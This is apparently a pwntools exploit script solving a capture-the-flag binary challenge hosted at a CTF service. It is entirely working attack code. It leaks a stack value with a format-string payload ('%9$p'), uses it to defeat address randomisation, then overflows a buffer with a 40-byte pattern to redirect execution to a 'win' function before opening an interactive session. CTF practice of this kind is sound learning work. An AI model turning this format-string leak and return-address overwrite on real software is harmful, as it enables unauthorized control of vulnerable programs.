from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 20646)
    else:
        return process(e.path)


p = start()
p.recvuntil(b'?')
p.sendline(b'%9$p')
leak = int(p.recv(), 16)
e.address = leak-e.sym['win']
winner = p64(e.sym['win']+38)
p.sendline(cyclic(40)+winner)
p.interactive()
